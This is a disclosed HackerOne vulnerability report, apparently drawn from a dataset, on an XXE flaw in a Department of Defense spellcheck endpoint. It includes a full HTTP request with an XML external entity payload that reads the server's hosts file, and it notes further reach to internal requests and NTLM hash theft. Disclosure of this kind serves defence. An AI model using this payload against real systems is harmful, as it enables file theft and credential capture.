---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '715949'
original_report_id: '715949'
title: '[HTA2] XXE on https://███ via SpellCheck Endpoint.'
weakness: XML External Entities (XXE)
team_handle: deptofdefense
created_at: '2019-10-16T22:11:38.263Z'
disclosed_at: '2023-05-15T15:13:37.449Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 33
tags:
- hackerone
- xml-external-entities-xxe
---

# [HTA2] XXE on https://███ via SpellCheck Endpoint.

## Metadata

- HackerOne Report ID: 715949
- Weakness: XML External Entities (XXE)
- Program: deptofdefense
- Disclosed At: 2023-05-15T15:13:37.449Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
There is a full read XXE vulnerability on 

## Steps To Reproduce:
  1. Log into `https://██████/` with the credentials `██████`
  2. Get your cookies and make the following HTTP Request with them

```
POST /Kview/CustomCodeBehind/Base/Utilities/RapidSpellHelpFile.aspx HTTP/1.1
Host: ███████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=UTF-8
Content-Length: 1238
Connection: close
Referer: https://██████████/Kview/CustomCodeBehind/Base/PersonalHomepage/PersonalHomepageCalendarAddEvent.aspx?EventAction=AddEvent&EventDate=10/16/2019%2012:00:01%20AM
Cookie: [COOKIES]

<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY a SYSTEM "file:///c:\Windows\System32\Drivers\etc\hosts">]>
<r><resp>xml</resp><textToCheck>&a;</textToCheck><IAW/><UserDictionaryFile/><DictFile>d:\Meridian\MWRA\MG\11.1\KView\CustomCodeBehind\Base/en-US/DICT-EN-US-USEnglish.dict</DictFile><SuggestionsMethod>HASHING_SUGGESTIONS</SuggestionsMethod><LanguageParser>ENGLISH</LanguageParser><SeparateHyphenWords>False</SeparateHyphenWords><V2Parser>True</V2Parser><SSLFriendlyPage>/KView/CustomCodeBehind/WebResource.axd?d=zqrwmEhOpCtb9wLAM9uWrOzT_jYv5Un0ehQNczyIJSp-b9XbsULhZuZahCBf8Qk8anUm2kaMbXSDgD8qtwoc7T6Vnc9cbWVmTwIkPCbvIqLzTEGbDgA2oGtmx8o1&amp;t=633221022140000000</SSLFriendlyPage><SuggestSplitWords>True</SuggestSplitWords><IncludeUserDictionaryInSuggestions>True</IncludeUserDictionaryInSuggestions><WarnDuplicates>True</WarnDuplicates><IgnoreWordsWithDigits>True</IgnoreWordsWithDigits><CheckCompoundWords>False</CheckCompoundWords><LookIntoHyphenatedText>True</LookIntoHyphenatedText><GuiLanguage>ENGLISH</GuiLanguage><IgnoreXML>False</IgnoreXML><IgnoreCapitalizedWords>False</IgnoreCapitalizedWords><ConsiderationRange>-1</ConsiderationRange><IgnoreURLsAndEmailAddresses>True</IgnoreURLsAndEmailAddresses><AllowMixedCase>False</AllowMixedCase></r>
```

You will see the contents of `c:\Windows\System32\Drivers\etc\hosts` in the response:

██████████


We can also make HTTP requests to external and internal applications and read the full responses. We can also like steal NTLM domain hashes.

████

## Supporting Material/References:

  * https://techblog.mediaservice.net/2018/02/from-xml-external-entity-to-ntlm-domain-hashes/

## Impact

Critical, an attacker can read local files, make HTTP requests to internal applications and read the responses, steal NTLM hashes, and also completely deny service to the application.

Best,
Corben Leo (@cdl)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
